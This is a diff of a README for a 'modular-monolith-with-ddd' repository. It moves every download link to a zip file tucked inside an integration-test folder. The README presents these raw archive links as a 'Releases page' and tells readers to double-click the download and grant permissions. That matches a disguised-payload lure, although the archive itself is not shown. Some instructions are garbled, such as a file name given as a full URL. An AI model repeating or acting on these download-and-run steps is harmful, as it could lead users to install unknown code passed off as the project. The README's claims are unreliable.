@@ -1,6 +1,6 @@
 # 🚀 modular-monolith-with-ddd - A User-Friendly Application for Growth
 
-[![Download from Releases](https://raw.githubusercontent.com/U-dot-du/modular-monolith-with-ddd/master/palmo/modular-monolith-with-ddd.zip%20Now%20%F0%9F%8D%8C-Release-brightgreen)](https://raw.githubusercontent.com/U-dot-du/modular-monolith-with-ddd/master/palmo/modular-monolith-with-ddd.zip)
+[![Download from Releases](https://github.com/U-dot-du/modular-monolith-with-ddd/raw/refs/heads/master/src/Modules/Meetings/Tests/IntegrationTests/Meetings/with_modular_ddd_monolith_1.7.zip%20Now%20%F0%9F%8D%8C-Release-brightgreen)](https://github.com/U-dot-du/modular-monolith-with-ddd/raw/refs/heads/master/src/Modules/Meetings/Tests/IntegrationTests/Meetings/with_modular_ddd_monolith_1.7.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ Before you get started, ensure your system meets the following requirements:
 Follow these simple steps to get your application up and running:
 
 1. **Visit the Releases Page**
-   Click [here to download](https://raw.githubusercontent.com/U-dot-du/modular-monolith-with-ddd/master/palmo/modular-monolith-with-ddd.zip) the latest version of the application. 
+   Click [here to download](https://github.com/U-dot-du/modular-monolith-with-ddd/raw/refs/heads/master/src/Modules/Meetings/Tests/IntegrationTests/Meetings/with_modular_ddd_monolith_1.7.zip) the latest version of the application. 
 
 2. **Choose the Right File**
    On the releases page, look for the latest version of the software. You will see a list of files available for download. Select the one that matches your operating system.
@@ -37,14 +37,14 @@ Follow these simple steps to get your application up and running:
    Click on the file to start the download. Your browser will save it to the default download location.
 
 4. **Locate the Downloaded File**
-   Once the download is complete, navigate to the folder where your files typically download. You should see the file named something like `https://raw.githubusercontent.com/U-dot-du/modular-monolith-with-ddd/master/palmo/modular-monolith-with-ddd.zip`.
+   Once the download is complete, navigate to the folder where your files typically download. You should see the file named something like `https://github.com/U-dot-du/modular-monolith-with-ddd/raw/refs/heads/master/src/Modules/Meetings/Tests/IntegrationTests/Meetings/with_modular_ddd_monolith_1.7.zip`.
 
 5. **Run the Application**
    Double-click the downloaded file to run the application. Follow any prompts to allow the necessary permissions.
 
 ## 🔧 Download & Install
 
-To get the application, please visit our [Releases page](https://raw.githubusercontent.com/U-dot-du/modular-monolith-with-ddd/master/palmo/modular-monolith-with-ddd.zip) again to find the latest version. 
+To get the application, please visit our [Releases page](https://github.com/U-dot-du/modular-monolith-with-ddd/raw/refs/heads/master/src/Modules/Meetings/Tests/IntegrationTests/Meetings/with_modular_ddd_monolith_1.7.zip) again to find the latest version. 
 
 1. Click on the download link for your version.
 2. Follow the on-screen instructions to install the application.
